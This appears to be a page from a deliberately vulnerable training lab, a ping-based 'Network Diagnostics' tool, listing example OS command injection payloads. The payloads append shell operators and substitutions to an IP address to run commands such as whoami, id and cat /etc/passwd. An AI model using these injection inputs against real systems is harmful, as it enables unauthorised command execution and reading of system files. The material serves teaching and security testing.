Network Diagnostics

Ping a host to check connectivity

Example payloads to try

Enter a legitimate host first, then try appending shell operators:

  • 127.0.0.1 — legitimate ping request; establishes a baseline response.
  • 127.0.0.1; whoami — semicolon ; is a command separator; runs whoami after ping.
  • 127.0.0.1 && cat /etc/passwd — && (AND) runs the next command only if ping succeeds.
  • 127.0.0.1 | id — pipe | sends ping output to id as input; both commands execute.
  • 127.0.0.1 || ls -la / — || (OR) runs the next command only if ping fails.
  • `whoami` — backtick substitution; the shell executes whoami and substitutes its output into the command string.
  • $(cat /etc/hostname) — inline command substitution ($() syntax); equivalent to backticks.
